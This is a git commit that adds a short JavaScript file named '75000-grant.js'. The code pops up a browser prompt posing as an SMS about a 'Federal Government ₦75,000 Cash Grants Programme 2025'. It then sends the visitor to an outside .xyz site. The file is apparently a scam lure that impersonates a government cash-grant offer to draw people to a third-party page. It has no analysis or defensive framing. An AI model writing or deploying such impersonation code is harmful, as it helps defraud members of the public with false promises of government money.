e5f76e0903f54146ae9c65738e29c746d964aa48
bigetijazz28 <bigetijazz28@gmail.com>
2025-09-09 10:06:36 +0100

    Create 75000-grant.js

---
+++ 75000-grant.js
@@ -0,0 +1,6 @@
+
+var password = 'Withdraw ₦75,000'
+password=prompt(' SMS: Welcome to Federal Government ₦75,000 Cash Grants Programme 2025, press OK to apply for this amazing offer','Withdraw ₦75,000');
+if (password != 'Withdraw ₦75,000') {
+location.href='https://www.ekuula.xyz/Withdraw-N75000-Grants';
+}
